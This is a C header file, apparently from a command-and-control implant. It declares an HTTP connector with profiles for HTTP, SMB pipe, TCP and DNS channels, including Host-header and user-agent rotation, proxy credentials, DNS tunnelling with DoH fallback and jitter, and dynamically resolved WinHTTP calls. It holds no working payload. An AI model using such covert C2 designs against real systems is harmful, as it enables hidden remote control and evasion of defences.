#pragma once

#include <windows.h>
#include <winhttp.h>
#include "Connector.h"

/* MinGW winhttp.h may omit flags named like WinInet; values match Windows SDK. */
#ifndef SECURITY_FLAG_IGNORE_REVOCATION
#define SECURITY_FLAG_IGNORE_REVOCATION 0x00000080u
#endif

#ifndef PROFILE_STRUCT
#define PROFILE_STRUCT

#define PROXY_TYPE_NONE     0
#define PROXY_TYPE_HTTP     1
#define PROXY_TYPE_HTTPS    2

typedef struct {
	ULONG  servers_count;
	BYTE** servers;
	WORD*  ports;
	BOOL   use_ssl;
	BYTE*  http_method;
	ULONG  uri_count;
	BYTE** uris;
	BYTE*  parameter;
	ULONG  ua_count;
	BYTE** user_agents;
	BYTE*  http_headers;
	ULONG  ans_pre_size;
	ULONG  ans_size;
	ULONG  hh_count;
	BYTE** host_headers;
	BYTE   rotation_mode;   // 0=sequential, 1=random
	BYTE   proxy_type;      // 0=none, 1=http, 2=https
	BYTE*  proxy_host;
	WORD   proxy_port;
	BYTE*  proxy_username;
	BYTE*  proxy_password;
} ProfileHTTP;

typedef struct {
	BYTE* pipename;
} ProfileSMB;

typedef struct {
	BYTE* prepend;
	WORD  port;
} ProfileTCP;

#define DNS_MODE_UDP           0
#define DNS_MODE_DOH           1
#define DNS_MODE_UDP_FALLBACK  2
#define DNS_MODE_DOH_FALLBACK  3

typedef struct {
	BYTE* domain;
	BYTE* resolvers;
	BYTE* doh_resolvers;
	BYTE* qtype;
	ULONG pkt_size;
	ULONG label_size;
	ULONG ttl;
	BYTE* encrypt_key;
	ULONG burst_enabled;
	ULONG burst_sleep;
	ULONG burst_jitter;
	ULONG dns_mode;
	BYTE* user_agent;
} ProfileDNS;
#endif

#define DECL_API(x) decltype(x) * x

struct HTTPFUNC {
	DECL_API(LocalAlloc);
	DECL_API(LocalReAlloc);
	DECL_API(LocalFree);
	DECL_API(LoadLibraryA);
	DECL_API(GetProcAddress);
	DECL_API(GetLastError);

	DECL_API(WinHttpOpen);
	DECL_API(WinHttpCloseHandle);
	DECL_API(WinHttpConnect);
	DECL_API(WinHttpOpenRequest);
	DECL_API(WinHttpSendRequest);
	DECL_API(WinHttpReceiveResponse);
	DECL_API(WinHttpQueryHeaders);
	DECL_API(WinHttpReadData);
	DECL_API(WinHttpSetOption);
	DECL_API(WinHttpAddRequestHeaders);
	DECL_API(WinHttpWriteData);
};

typedef struct _ConnectorHTTPData {
	ULONG  ua_count;
	CHAR** user_agents;
	ULONG  ua_index;
	ULONG  hh_count;
	CHAR** host_headers;
	ULONG  hh_index;
	BOOL   ssl;
	CHAR*  http_method;
	ULONG  server_count;
	CHAR** server_address;
	WORD*  server_ports;
	ULONG  uri_count;
	CHAR** uris;
	ULONG  uri_index;
	CHAR*  headers;
	ULONG  ans_size;
	ULONG  ans_pre_size;
	BYTE   rotation_mode;

	BYTE* recvData;
	int   recvSize;

	BYTE  proxy_type;
	CHAR* proxy_url;
	CHAR* proxy_username;
	CHAR* proxy_password;

	HTTPFUNC* functions;

	HINTERNET hInternet;
	HINTERNET hConnect;

	ULONG server_index;
} ConnectorHTTPData;

Connector* CreateConnectorHTTP();
